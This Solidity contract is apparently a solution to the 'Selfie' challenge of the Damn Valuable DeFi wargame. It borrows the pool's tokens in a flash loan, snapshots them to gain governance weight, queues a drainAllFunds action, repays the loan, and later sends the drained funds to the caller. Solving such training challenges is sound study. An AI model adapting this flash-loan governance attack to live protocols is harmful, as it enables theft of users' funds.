// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract Exploit{
    SimpleGovernance governanceContract;
    SelfiePool flashLoanPool;
    DamnValuableTokenSnapshot token;

    uint256 actionId;

    constructor(address _governanceContract, address _flashLoanPool, address _token) {
        governanceContract = SimpleGovernance(_governanceContract);
        flashLoanPool = SelfiePool(_flashLoanPool);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 tokensInPool) public {
        //get the flashloan
        flashLoanPool.flashLoan(tokensInPool);
    }

    fallback() external {
        uint256 contractBalance = token.balanceOf(address(this));
        require(contractBalance > 0, "contractBalance = 0");
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(this)
        );
        //record the snapshot of the current state and queue an action.
        token.snapshot();
        actionId = governanceContract.queueAction(address(flashLoanPool), data, 0);
        //pay the flashLoan back
        token.transfer(address(flashLoanPool), contractBalance);
    }

    function executeAction() public {
        //execute the drainAllFunds() with msg.sender as governance contract
        governanceContract.executeAction(actionId);
        // transfer the funds from contract to attacker
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}